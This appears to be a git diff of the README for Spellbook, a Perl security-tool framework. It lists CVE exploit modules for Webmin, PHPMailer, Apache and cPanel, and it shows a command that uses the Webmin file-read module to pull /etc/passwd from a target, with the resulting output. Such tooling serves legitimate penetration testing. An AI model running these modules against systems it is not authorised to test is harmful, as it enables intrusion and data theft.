@@ -1,7 +1,7 @@
 <p align="center">
   <img src="https://heitorgouvea.me/images/projects/spellbook/logo.png" width="120px" height="120px">
   <h3 align="center"><b>Spellbook</b></h3>
-  <p align="center">A micro-framework for rapid development of reusable security tools</p>
+  <p align="center">A framework for rapid development of reusable security tools</p>
   <p align="center">
     <a href="https://github.com/htrgouvea/spellbook/blob/master/LICENSE.md">
       <img src="https://img.shields.io/badge/license-MIT-blue.svg">
@@ -53,27 +53,35 @@ Core Commands
 
 ```
 # Searching for exploits 
-$ perl spellbook.pl --search exploit
+$ ./spellbook.pl --search advisory
 
-Module: Exploit::CVE_2017_5487
+Module: Advisory::CVE_2017_5487
 Description: Read usernames leaked on WordPress API
 =================================================
 
-Module: Exploit::Shellshock
-Description: Exploit for shellshock vuln
+Module: Advisory::CVE_2006_3392
+Description: Read arbitrary files for servers running Webmin before 1.290 and Usermin before 1.220
 =================================================
 
-Module: Exploit::Subdomain_Takeover_Check
-Description: A checker for the possibility of subdomain takeover attack
+Module: Advisory::CVE_2016_10045
+Description: PHPMailer < 5.2.20 Remote Code Execution PoC 0day Exploit (CVE-2016-10045) (Bypass of the CVE-2016-1033 patch)
+=================================================
+
+Module: Advisory::CVE_2021_41773
+Description: Exploit path Traversal or RCE in Apache HTTP Server 2.4
+=================================================
+
+Module: Advisory::CVE_2023_29489
+Description: Exploit for cPanel Reflected XSS - CVE-2023-29489
 =================================================
 [...]
 ```
 
 ```
 # Using an exploit
-$ perl spellbook.pl -m Exploit::CVE_2006_3392 --help
+$ perl spellbook.pl -m Advisory::CVE_2006_3392 --help
 
-Exploit::CVE_2006_3392
+Advisory::CVE_2006_3392
 =======================
 -h, --help     See this menu
 -t, --target   Define a target
@@ -81,7 +89,7 @@ Exploit::CVE_2006_3392
 ```
 
 ```
-$ perl spellbook.pl -m Exploit::CVE_2006_3392 -t http://172.30.0.15:10000/ -f /etc/passwd
+$ perl spellbook.pl -m Advisory::CVE_2006_3392 -t http://172.30.0.15:10000/ -f /etc/passwd
 
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/bin/sh
